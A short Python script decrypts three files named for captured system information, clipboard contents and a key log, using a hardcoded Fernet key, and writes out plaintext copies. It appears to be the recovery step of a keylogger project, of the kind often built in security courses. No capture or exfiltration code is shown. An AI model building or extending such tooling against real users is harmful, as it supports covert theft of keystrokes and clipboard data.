from cryptography.fernet import Fernet

key="4kA68DkMKND5r0u-LiYRU76XBvpxhKOqwkQwkIv8hvA="
system_info_e="../Project/e_system_info.txt"
clipboard_info_e="../Project/e_clipboard.txt"
keys_info_e="../Project/e_key_log.txt"

encrypted_files=[system_info_e,clipboard_info_e,keys_info_e]

for encrypted_file in encrypted_files:
    with open(encrypted_file, 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)
    decrypted_file = encrypted_file.replace("e_", "decrypted_", 1)
    with open(decrypted_file, 'wb') as f:
        f.write(decrypted)
